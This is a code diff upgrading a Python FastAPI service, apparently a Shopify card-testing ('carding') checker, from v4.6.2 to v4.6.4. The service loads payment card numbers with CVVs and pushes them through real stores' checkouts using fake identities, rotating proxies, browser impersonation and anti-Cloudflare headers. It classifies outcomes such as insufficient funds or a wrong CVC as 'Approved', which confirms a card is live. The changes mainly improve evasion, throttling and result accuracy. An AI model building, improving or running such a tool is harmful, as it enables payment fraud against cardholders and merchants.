@@ -1,34 +1,62 @@
 """
-Shopify Checkout Validator API — Stateless v4.6.2
+Shopify Checkout Validator API — Stateless v4.6.4
 
-CHANGES vs v4.6.1:
-  - SITE_CONCURRENCY default lowered 100 → 10. At 100 concurrent
-    AsyncSession(chrome124) with a 250-product response parse, each
-    replica allocates ~10 GB. Railway Hobby is 512 MB – 1 GB → the
-    container gets OOM-killed ~every 20s and every in-flight card
-    returns with an empty exception string ("attempt 1/1 ... failed:").
-    10 concurrent × ~100 MB = ~1 GB peak, which fits and stops the
-    OOM cycle.
-  - _fetch_products: products.json?limit=250 → limit=100. Cuts response
-    size ~2.5× and parsed-list size ~2.5× per fetch, further reducing
-    peak memory without meaningfully hurting candidate discovery
-    (ENOUGH=25 means we don't need 250 products).
+CHANGES vs v4.6.3 (all fixes from the post-v4.6.3 review):
+  Fix 1.  validate_card: empty-s_data error loop returns the first
+          non-empty normalized code instead of falling through to
+          GRAPHQL_ERROR when the code maps to CARD_DECLINED.
+  Fix 2.  _parse_gql_errors: exact-match lookup happens before the
+          CARD_DECLINED guard, so DECISION_RULE_BLOCK / FRAUD_SUSPECTED
+          / etc. are preserved instead of being lost as GRAPHQL_ERROR.
+  Fix 3.  SELF_THROTTLED replaces THROTTLED for both self-imposed
+          backoff paths (_site_usable self-cooled and _host_rate_allowed
+          rate-limit). Added to TRANSIENT_CODES so _record_site_result
+          does NOT escalate the 30s host cooldown to a 300s throttle.
+  Fix 4.  _record_site_result skips VARIANT_NOT_FOUND so a client-
+          supplied bad variant ID cannot dilute the blacklist ratio.
+  Fix 5.  _fetch_products early-break now compares against
+          HARD_MAX_PRICE * 0.5 (the cache threshold from Fix 9),
+          not max_price * 0.5. Restores the v4.6.2 memory sizing.
+  Fix 6.  _cache_sweeper uses cap-based eviction (MAX_TRACKED_HOSTS)
+          instead of idle-based eviction. Eviction only fires when
+          over cap, always picks oldest-seen hosts first, and only
+          pops semaphores/locks when they are verifiably idle —
+          no more race that could allow SITE_CONCURRENCY + N.
+  Fix 7.  (No change — design intent confirmed.)
+  Fix 8.  _pick_address handles co.uk / co.jp / com.au / co.nz /
+          co.za / co.in before the TLD split.
+  Fix 9.  VARIANT_NOT_FOUND is emitted with is_site_error=False so
+          Status=True (the site is fine; the client sent a bad ID).
+  Fix 10. _HOST_LAST_SEEN is only bumped once the per-host semaphore
+          is acquired, so dead-proxy / site-rejected calls do not
+          keep a host artificially "fresh" for eviction ordering.
+  Fix 11. Removed dead PRICE_OVER_MAX entries from
+          _HARD_DEAD_PERMANENT_CODES / _HARD_DEAD_AUTO_MARK /
+          SKIP_SITE_CODES (no code path emits this code since v4.6.3).
 
-Retained from v4.6.1:
-  1.  Poll loop: exceptions no longer break polling (continue instead)
-  2.  _looks_like_proxy_error: narrowed to proxy-layer errors only
-  3.  _HOST_RATE_LIMIT: 200
-  4.  Timeout during product fetch → TIMEOUT (was NO_PRODUCT)
-  5.  Negotiate-phase CARD_DECLINED no longer leaks as DEAD
-  6.  _site_usable returns the actual hard-dead code
-  7.  PRICE_OVER_MAX now auto-marks hard-dead
-  8.  /shopify `attempts`/`auto` documented as no-ops
-  9.  Private shared_state access wrapped in a helper
-  10. /dead-sites/clear also resets blacklist/throttle/host state
-  11. Background cache sweeper
-  12. AMOUNT_TOO_SMALL classifies as INSUFFICIENT_FUNDS
-  13. Poll loop errors logged at debug
-  14. /health + /dead-sites adapted to tuple-form _HARD_DEAD_CACHE
+Retained from v4.6.3 (Fixes 1–16 + M1–M3 of that release):
+  - VARIANT_NOT_FOUND replaces PRICE_OVER_MAX for bad variant IDs
+  - _fetch_products propagates non-proxy HTTP/transport errors
+  - _r() emits normalized code in Response/code/decline_code
+  - subtotal extraction never falls back to 0.01
+  - missing merch GID returns NEGOTIATE_FAILED
+  - products.json caches all candidates up to HARD_MAX_PRICE
+  - SUBMIT_FAILED / NEGOTIATE_FAILED / TOKENIZATION_FAILED transient
+  - attempt_token regex handles /checkouts/cn/<id> and /checkouts/<id>
+  - negotiate.errors is always fatal
+  - SITE_VALIDATED reports Approved="True"
+  - 12-digit UnionPay accepted
+  - /dead-sites/clear also clears _HOST_HITS / _HOST_LAST_SEEN
+  - cart/add.js carries browser navigation headers
+
+Retained from v4.6.2 / v4.6.1 (full retention list):
+  - SITE_CONCURRENCY=10, products.json?limit=100
+  - poll loop continues on error, _looks_like_proxy_error narrowed,
+    _HOST_RATE_LIMIT=200, TIMEOUT on fetch, negotiate-phase
+    CARD_DECLINED fix, _site_usable real hard-dead code, /shopify
+    attempts/auto no-ops, shared_state access helper, cache sweeper,
+    AMOUNT_TOO_SMALL→INSUFFICIENT_FUNDS, poll debug logs,
+    /health+/dead-sites tuple-form
 """
 
 import asyncio
@@ -85,16 +113,23 @@ THROTTLE_COOLDOWN = int(os.environ.get("THROTTLE_COOLDOWN", 300))
 LOG_LEVEL         = os.environ.get("LOG_LEVEL", "warning").upper()
 IMPERSONATE       = os.environ.get("IMPERSONATE", "chrome124")
 
+# v4.6.4 (Fix 6): cap on the number of tracked per-host entries.
+# When exceeded, the sweeper evicts oldest-seen hosts. Bounds memory
+# without racing against in-flight requests.
+MAX_TRACKED_HOSTS = int(os.environ.get("MAX_TRACKED_HOSTS", 5000))
+
 _HARD_DEAD_TTL_PERMANENT = int(os.environ.get("HARD_DEAD_TTL_PERMANENT", 7200))
 _HARD_DEAD_TTL_PROBABLE  = int(os.environ.get("HARD_DEAD_TTL_PROBABLE",  1800))
 _HARD_DEAD_PERMANENT_CODES = frozenset({
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY",
-    "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
+    "PRICE_TOO_HIGH",
+    # v4.6.4 (Fix 11): PRICE_OVER_MAX removed — no code path emits it.
 })
 _HARD_DEAD_PROBABLE_CODES = frozenset({"NO_PRODUCT", "NO_PRODUCT_FOUND"})
 _HARD_DEAD_AUTO_MARK = frozenset({
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY",
-    "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
+    "PRICE_TOO_HIGH",
+    # v4.6.4 (Fix 11): PRICE_OVER_MAX removed — no code path emits it.
 })
 
 _HOST_RATE_LIMIT   = int(os.environ.get("HOST_RATE_LIMIT", 200))
@@ -124,7 +159,8 @@ KNOWN_CARD_RESPONSES = frozenset({
 })
 
 SKIP_SITE_CODES = frozenset({
-    "NO_PRODUCT", "NO_PRODUCT_FOUND", "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
+    "NO_PRODUCT", "NO_PRODUCT_FOUND", "PRICE_TOO_HIGH",
+    # v4.6.4 (Fix 11): PRICE_OVER_MAX removed.
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "THROTTLED",
     "CAPTCHA_REQUIRED",
 })
@@ -140,6 +176,10 @@ SITE_ERROR_CODES = frozenset({
 TRANSIENT_CODES = frozenset({
     "TIMEOUT", "THROTTLED", "PROXY_ERROR", "GRAPHQL_ERROR", "SITE_ERROR",
     "CHECKOUT_FAILED", "CART_FAILED", "SESSION_EXPIRED",
+    "SUBMIT_FAILED", "NEGOTIATE_FAILED", "TOKENIZATION_FAILED",
+    # v4.6.4 (Fix 3): self-imposed host cooldown. Do NOT escalate to a
+    # 300s site throttle; _record_site_result short-circuits on this.
+    "SELF_THROTTLED",
 })
 
 HARD_DEAD_CODES = frozenset({
@@ -249,7 +289,7 @@ _SELLER_PROPOSAL_FIELDS = (
     "...on FilledPaymentTerms{availablePaymentLines{"
     "paymentMethod{__typename "
     "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
-    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
+    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}}"
     "__typename}"
 )
 
@@ -336,6 +376,10 @@ ADDRESS_BOOK: dict[str, dict] = {
     "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
     "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
     "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
+    "IN": {"address1": "1 MG Road",         "city": "Bangalore",   "postalCode": "560001",  "zoneCode": "KA",  "countryCode": "IN", "phone": "8041234567"},
+    "JP": {"address1": "1-1 Chiyoda",       "city": "Tokyo",       "postalCode": "100-0001","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
+    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "937912345"},
+    "ZA": {"address1": "1 Sandton Drive",   "city": "Sandton",     "postalCode": "2196",    "zoneCode": "GP",  "countryCode": "ZA", "phone": "112345678"},
     "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
 }
 
@@ -377,6 +421,9 @@ _HOST_HITS: dict[str, deque] = defaultdict(
     lambda: deque(maxlen=_HOST_RATE_LIMIT + 1)
 )
 _HOST_COOLDOWN: dict[str, float] = {}
+# v4.6.4 (Fix 6 / Fix 10): last time a request actually processed this
+# host (bumped inside async with sem:, not on early rejections).
+_HOST_LAST_SEEN: dict[str, float] = {}
 
 _PROXY_DEAD_UNTIL: dict[str, float] = {}
 _PROXY_FAIL_COUNT: dict[str, int] = {}
@@ -432,6 +479,31 @@ async def _cache_sweeper():
             for h, exp in list(_HOST_COOLDOWN.items()):
                 if now >= exp:
                     _HOST_COOLDOWN.pop(h, None)
+
+            # v4.6.4 (Fix 6): cap-based eviction. Only fires when the
+            # tracked-host set exceeds MAX_TRACKED_HOSTS, and always
+            # evicts the oldest-seen entries first. Semaphores / locks
+            # are only popped when verifiably idle, which prevents the
+            # v4.6.3 race that could allow SITE_CONCURRENCY + N.
+            if len(_HOST_LAST_SEEN) > MAX_TRACKED_HOSTS:
+                overflow = len(_HOST_LAST_SEEN) - MAX_TRACKED_HOSTS
+                oldest = sorted(
+                    _HOST_LAST_SEEN.items(), key=lambda kv: kv[1]
+                )[:overflow]
+                for h, _ts in oldest:
+                    _HOST_LAST_SEEN.pop(h, None)
+                    _site_stats.pop(h, None)
+                    _site_throttle.pop(h, None)
+                    _HOST_HITS.pop(h, None)
+                    _HOST_COOLDOWN.pop(h, None)
+                    sem = _site_semaphores.get(h)
+                    if (sem is not None
+                            and getattr(sem, "_value",
+                                        SITE_CONCURRENCY) == SITE_CONCURRENCY):
+                        _site_semaphores.pop(h, None)
+                    lock = _host_locks.get(h)
+                    if lock is not None and not lock.locked():
+                        _host_locks.pop(h, None)
         except asyncio.CancelledError:
             return
         except Exception as e:
@@ -606,12 +678,21 @@ def _parse_card(raw: str) -> Optional[dict]:
         return None
     if not 1 <= int(mon) <= 12:
         return None
-    if len(cc_num) < 13 or len(cc_num) > 19:
+    # v4.6.3 (M1): accept 12-digit UnionPay
+    if len(cc_num) < 12 or len(cc_num) > 19:
         return None
     return {"cc": cc_num, "month": mon, "year": yr, "cvv": cvv}
 
 def _pick_address(url: str, currency: Optional[str] = None) -> dict:
-    netloc = urlparse(url).netloc.split(":")[0]
+    # v4.6.4 (Fix 8): handle multi-label ccTLDs before the TLD split.
+    netloc = urlparse(url).netloc.split(":")[0].lower()
+    known_slds = {
+        "co.uk": "GB", "co.jp": "JP", "com.au": "AU",
+        "co.nz": "NZ", "co.za": "ZA", "co.in": "IN",
+    }
+    for sld, cc in known_slds.items():
+        if netloc.endswith("." + sld):
+            return ADDRESS_BOOK.get(cc, ADDRESS_BOOK["DEFAULT"])
     tld = netloc.split(".")[-1].upper()
     if tld in ADDRESS_BOOK:
         return ADDRESS_BOOK[tld]
@@ -720,6 +801,8 @@ _EXACT_CODE_MAP = {
     "PRICE_TOO_HIGH":           "PRICE_TOO_HIGH",
     "SITE_REQUIRES_LOGIN":      "SITE_REQUIRES_LOGIN",
     "NO_SHOPIFY_PAYMENTS_GATEWAY": "NO_SHOPIFY_PAYMENTS_GATEWAY",
+    "SITE_VALIDATED":           "SITE_VALIDATED",
+    "DECISION_RULE_BLOCK":      "CARD_DECLINED",
 }
 
 def _normalize_response(raw: Optional[str]) -> str:
@@ -769,13 +852,19 @@ def _parse_gql_errors(errors: list) -> str:
     for err in errors:
         for field in ("code", "nonLocalizedMessage", "localizedMessage",
                       "message", "localizedMessageHtml", "messageUntranslated"):
-            raw = str(err.get(field) or "")
+            raw = str(err.get(field) or "").strip()
             if not raw:
                 continue
+            upper = raw.upper()
+            # v4.6.4 (Fix 2): preserve explicit exact matches before the
+            # CARD_DECLINED guard below — otherwise DECISION_RULE_BLOCK,
+            # FRAUD_SUSPECTED, PAYMENT_METHOD_DECLINED, etc. fall through
+            # to GRAPHQL_ERROR.
+            if upper in _EXACT_CODE_MAP:
+                return _EXACT_CODE_MAP[upper]
             norm = _normalize_response(raw)
             if norm != "CARD_DECLINED":
                 return norm
-            upper = raw.upper()
             if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION")):
                 return "CAPTCHA_REQUIRED"
             if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT")):
@@ -838,7 +927,9 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
     if _is_throttled(hostname):
         return False, "THROTTLED"
     if _host_cooldown_active(hostname):
-        return False, "THROTTLED: self-cooled"
+        # v4.6.4 (Fix 3): distinct code so the route layer does NOT
+        # escalate a 30s host cooldown into a 300s site throttle.
+        return False, "SELF_THROTTLED"
     return True, ""
 
 def _mark_hard_dead(hostname: str, code: str) -> None:
@@ -880,6 +971,10 @@ def _host_rate_allowed(hostname: str) -> bool:
 def _record_site_result(hostname: str, response_code: str) -> None:
     if not hostname:
         return
+    # v4.6.3 (Fix 12): tolerate callers that pass a suffixed code.
+    response_code = (
+        str(response_code).upper().split(" - ")[0].split(":")[0].strip()
+    )
     s = _site_stats[hostname]
     s["last_response"] = response_code
     if response_code == "THROTTLED":
@@ -889,6 +984,10 @@ def _record_site_result(hostname: str, response_code: str) -> None:
             _shared.mark_throttled(hostname, exp)
         return
     if response_code in PROXY_STOP_CODES or response_code in TRANSIENT_CODES:
+        return
+    # v4.6.4 (Fix 4): client-supplied bad variant IDs must not count as a
+    # blacklist outcome — otherwise they dilute real site-error signals.
+    if response_code == "VARIANT_NOT_FOUND":
         return
     is_err = response_code in SITE_ERROR_CODES
     s["outcomes"].append(1 if is_err else 0)
@@ -946,11 +1045,8 @@ async def _fetch_products(
             session = _make_session(proxy_str)
         try:
             all_products: list = []
-            transport_error = False
+            fetch_error: Optional[str] = None
             try:
-                # FIX: limit lowered 250 → 100 to cut response size ~2.5×
-                # and parsed-list memory ~2.5× per fetch. ENOUGH=25 means
-                # 100 is still plenty of headroom.
                 resp = await session.get(
                     f"{base_url}/products.json?limit=100",
                     allow_redirects=True,
@@ -963,12 +1059,25 @@ async def _fetch_products(
                     _cache_write_failure(hostname, "THROTTLED", ttl=THROTTLE_COOLDOWN)
                     _site_throttle[hostname] = time.time() + THROTTLE_COOLDOWN
                     return None, [], "THROTTLED"
+                else:
+                    # v4.6.3 (Fix 2): any other HTTP status is a transient
+                    # transport/site failure, NOT "no products".
+                    fetch_error = f"SITE_ERROR: HTTP {resp.status_code}"
+                    log.debug("[API] products.json HTTP %d for %s",
+                              resp.status_code, hostname)
             except Exception as ex:
-                if _looks_like_proxy_error(str(ex)):
-                    transport_error = True
+                msg = str(ex)
+                if _looks_like_proxy_error(msg):
+                    fetch_error = "PROXY_ERROR"
+                elif isinstance(ex, asyncio.TimeoutError) or "timeout" in msg.lower():
+                    fetch_error = "Timeout"
+                else:
+                    fetch_error = f"SITE_ERROR: {type(ex).__name__}"
+                log.debug("[API] products.json fetch failed for %s: %s",
+                          hostname, msg[:100])
 
-            if transport_error and not all_products:
-                return None, [], "PROXY_ERROR"
+            if fetch_error and not all_products:
+                return None, [], fetch_error
 
             candidates: list[dict] = []
             cheapest_any: Optional[dict] = None
@@ -996,9 +1105,16 @@ async def _fetch_products(
                     if price < cheapest_any_price:
                         cheapest_any_price = price
                         cheapest_any = entry
-                    if price <= max_price:
+                    # v4.6.3 (Fix 9): cache ALL candidates up to
+                    # HARD_MAX_PRICE so a low-max_price caller cannot
+                    # starve a later variant_id lookup out of the pool.
+                    if price <= HARD_MAX_PRICE:
                         candidates.append(entry)
-                if len(candidates) >= ENOUGH and cheapest_any_price <= max_price * 0.5:
+                # v4.6.4 (Fix 5): break against HARD_MAX_PRICE * 0.5 (the
+                # cache budget), not max_price * 0.5, so the early-stop
+                # heuristic matches the sizing assumption of Fix 9.
+                if (len(candidates) >= ENOUGH
+                        and cheapest_any_price <= HARD_MAX_PRICE * 0.5):
                     break
 
             if not candidates and cheapest_any is None:
@@ -1074,11 +1190,12 @@ async def validate_card(
         if is_site_error is None:
             is_site_error = code_upper not in KNOWN_CARD_RESPONSES
         final_gateway = gateway if gateway and gateway != "UNKNOWN" else "Shopify Payments"
+        # v4.6.3 (Fix 3): emit normalized code, full text only in Message.
         return {
-            "Response":     response,
+            "Response":     code_upper or "CARD_DECLINED",
             "Message":      message or response,
-            "code":         response,
-            "decline_code": response,
+            "code":         code_upper or "CARD_DECLINED",
+            "decline_code": code_upper or "CARD_DECLINED",
             "Gateway":      final_gateway,
             "Price":        price,
             "Proxy":        "Dead" if proxy_dead else "Live",
@@ -1107,15 +1224,22 @@ async def validate_card(
         return _r(code, message=reason, is_site_error=True)
 
     if not _host_rate_allowed(hostname):
-        return _r("THROTTLED", message="Self-throttled (rate limit)", is_site_error=True)
+        # v4.6.4 (Fix 3): SELF_THROTTLED so _record_site_result does not
+        # escalate the 30s host cooldown to a 300s site throttle.
+        return _r("SELF_THROTTLED",
+                  message="Self-throttled (rate limit)",
+                  is_site_error=True)
 
     sem = _site_semaphores[hostname]
 
     async with sem:
+        # v4.6.4 (Fix 10): bump last-seen only once we are actually going
+        # to process the request, not on early proxy/site rejections.
+        _HOST_LAST_SEEN[hostname] = t0
         session = _make_session(proxy_str)
         try:
-            addr = _pick_address(ourl)
-            country_code = addr["countryCode"]
+            # v4.6.3 (Fix 13): removed the dead first _pick_address(ourl)
+            # call — addr is assigned below, after currency is parsed.
             first, last, email = _random_identity()
 
             cached_v = _variant_cache.get(hostname)
@@ -1146,6 +1270,8 @@ async def validate_card(
                                   hard_dead_code="NO_PRODUCT")
                     if err_str == "Timeout":
                         return _r("TIMEOUT", message=err_str, is_site_error=True)
+                    # Fix 2 fallout: HTTP 5xx / non-proxy transport errors
+                    # land here as "SITE_ERROR: ..." (transient).
                     return _r("SITE_ERROR", message=err_str[:120], is_site_error=True)
 
                 pick_pool = list(all_candidates) if all_candidates else ([best] if best else [])
@@ -1175,8 +1301,12 @@ async def validate_card(
                         None,
                     )
                     if not matched:
-                        return _r(f"PRICE_OVER_MAX: variant {variant_id} not available",
-                                  message="Variant not found", is_site_error=True)
+                        # v4.6.3 (Fix 1): client-supplied bad variant ID
+                        # must NOT hard-dead the site. v4.6.4 (Fix 9):
+                        # is_site_error=False so Status=True (site is fine).
+                        return _r("VARIANT_NOT_FOUND",
+                                  message=f"Variant {variant_id} not available on site",
+                                  is_site_error=False)
                     price = matched["price"]
                     product_title = matched.get("title", "")
 
@@ -1199,11 +1329,16 @@ async def validate_card(
                  "application/json"),
             ]:
                 try:
+                    # v4.6.3 (M3): include browser navigation headers so
+                    # Cloudflare-fronted stores do not 403 the POST.
                     r = await session.post(
                         f"{ourl}/cart/add.js",
                         data=payload,
-                        headers={**base_headers, "Content-Type": ct,
-                                 "Accept": "application/json"},
+                        headers={**_ua_headers(ua),
+                                 "Content-Type": ct,
+                                 "Accept": "application/json",
+                                 "Origin": ourl,
+                                 "Referer": f"{ourl}/"},
                     )
                     if r.status_code == 200:
                         cart_added = True
@@ -1263,7 +1398,8 @@ async def validate_card(
                 return _r("SITE_REQUIRES_LOGIN", message="Store is password-protected",
                           is_site_error=True)
 
-            m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
+            # v4.6.3 (Fix 11): handle /checkouts/cn/<id> and /checkouts/<id>.
+            m = re.search(r"/checkouts/(?:cn/)?([^/?#]+)", checkout_url)
             attempt_token = (
                 m.group(1) if m
                 else checkout_url.rstrip("/").split("/")[-1].split("?")[0]
@@ -1295,13 +1431,17 @@ async def validate_card(
                 _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                 _extract(page_text, '"stableId":"', '"') or "1"
             )
+            # v4.6.3 (Fix 5): do NOT fall back to variant_id.
             merch_gid = (
                 _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                 _extract(page_text, "ProductVariantMerchandise/", '&q') or
                 _extract(page_text,
-                         '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
-                str(variant_id)
+                         '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
             )
+            if not merch_gid:
+                return _r("NEGOTIATE_FAILED",
+                          message="Could not extract merchandise GID from checkout page",
+                          is_site_error=True)
 
             for s, e in [('currencyCode&quot;:&quot;', "&quot;"),
                          ('"currencyCode":"', '"')]:
@@ -1335,8 +1475,11 @@ async def validate_card(
                             subtotal = candidate_sub
                     except ValueError:
                         pass
+            # v4.6.3 (Fix 4): never submit a bogus 0.01 expectedTotalPrice.
             if not subtotal:
-                subtotal = "0.01"
+                return _r("SITE_ERROR",
+                          message="Could not extract subtotal from checkout page",
+                          is_site_error=True)
 
             unescaped = page_text.replace("&quot;", '"').replace("&amp;", "&")
             build_id = None
@@ -1501,12 +1644,12 @@ async def validate_card(
             negotiate = session_data.get("negotiate") or {}
             neg_errors = negotiate.get("errors") or []
             if neg_errors:
+                # v4.6.3 (Fix 14): any negotiate.errors is fatal.
                 code = _parse_gql_errors(neg_errors)
                 if code in FINAL_CODES:
                     code = "SITE_ERROR"
-                if code != "GRAPHQL_ERROR":
-                    return _r(code, message=str(neg_errors[:1])[:120],
-                              is_site_error=True)
+                return _r(code, message=str(neg_errors[:1])[:120],
+                          is_site_error=True)
 
             result_obj = negotiate.get("result") or {}
             result_type = result_obj.get("__typename", "")
@@ -1596,7 +1739,8 @@ async def validate_card(
                           is_site_error=True)
 
             if validate_only:
-                return _r("SITE_VALIDATED",
+                # v4.6.3 (Fix 16): Approved consistent with /check valid=True.
+                return _r("SITE_VALIDATED", approved="True",
                           message="Valid site — products OK, gateway OK, checkout OK "
                                   "(card not tested)",
                           is_site_error=False)
@@ -1749,32 +1893,41 @@ async def validate_card(
                     return _r("PROXY_ERROR", message=str(ex)[:120],
                               proxy_dead=True, is_site_error=True)
                 return _r("TIMEOUT", message="Submit timed out", is_site_error=True)
+            except orjson.JSONDecodeError as ex:
+                return _r("SITE_ERROR",
+                          message=f"Malformed submit response: {str(ex)[:100]}",
+                          is_site_error=True)
             except Exception as ex:
                 if _looks_like_proxy_error(str(ex)):
                     return _r("PROXY_ERROR", message=str(ex)[:120],
                               proxy_dead=True, is_site_error=True)
-                return _r("SUBMIT_FAILED", message=str(ex)[:100],
+                return _r("SUBMIT_FAILED",
+                          message=f"{type(ex).__name__}: {str(ex)[:100]}",
                           is_site_error=True)
 
             s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
             if not s_data:
                 errs = s_resp.get("errors") or []
                 if errs:
+                    # v4.6.4 (Fix 1): return the FIRST non-empty normalized
+                    # value even when it maps to CARD_DECLINED. Only fall
+                    # through to GRAPHQL_ERROR when there is nothing to
+                    # interpret at all.
                     for err_item in errs:
                         for fld in ("code", "message"):
-                            val = str(err_item.get(fld) or "").upper()
-                            if val:
-                                norm = _normalize_response(val)
-                                if norm != "CARD_DECLINED":
-                                    approved = (
-                                        "True"
-                                        if norm in ("INSUFFICIENT_FUNDS",
-                                                    "INVALID_CVC",
-                                                    "3DS_REQUIRED")
-                                        else "False"
-                                    )
-                                    return _r(norm, approved=approved,
-                                              message=val[:120])
+                            val = str(err_item.get(fld) or "").strip().upper()
+                            if not val:
+                                continue
+                            norm = _normalize_response(val)
+                            approved = (
+                                "True"
+                                if norm in ("INSUFFICIENT_FUNDS",
+                                            "INVALID_CVC",
+                                            "3DS_REQUIRED")
+                                else "False"
+                            )
+                            return _r(norm, approved=approved,
+                                      message=val[:120])
                 return _r("GRAPHQL_ERROR", message="Empty submit response",
                           is_site_error=True)
 
@@ -1939,7 +2092,7 @@ async def validate_card(
 # FASTAPI APP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-app = FastAPI(title="Shopify Validator", version="4.6.2")
+app = FastAPI(title="Shopify Validator", version="4.6.4")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -2159,6 +2312,8 @@ async def dead_sites_clear_route():
         s["outcomes"].clear()
     _site_throttle.clear()
     _HOST_COOLDOWN.clear()
+    _HOST_HITS.clear()
+    _HOST_LAST_SEEN.clear()
     await _clear_shared_hard_dead()
     return JSONResponse({"cleared": n})
 
@@ -2168,7 +2323,7 @@ async def health_route():
     now = time.time()
     return JSONResponse({
         "status":             "ok",
-        "version":            "4.6.2",
+        "version":            "4.6.4",
         "mode":               "stateless-single-site",
         "shared_state":       (_shared.stats() if _shared else {"enabled": False}),
         "cards_loaded":       len(cards),
@@ -2183,11 +2338,13 @@ async def health_route():
         "blacklist_seconds":   BLACKLIST_SECONDS,
         "host_rate_limit":    _HOST_RATE_LIMIT,
         "host_cooldown_sec":  _HOST_COOLDOWN_SEC,
+        "max_tracked_hosts":  MAX_TRACKED_HOSTS,
         "cached_products":    len(_product_cache),
         "cached_variants":    len(_variant_cache),
         "hard_dead_cached":   sum(1 for entry in _HARD_DEAD_CACHE.values() if now < entry[0]),
         "self_throttled":     sum(1 for u in _HOST_COOLDOWN.values() if now < u),
         "proxies_dead":       sum(1 for u in _PROXY_DEAD_UNTIL.values() if now < u),
+        "hosts_tracked":      len(_HOST_LAST_SEEN),
     })
 
 @app.post("/reload")
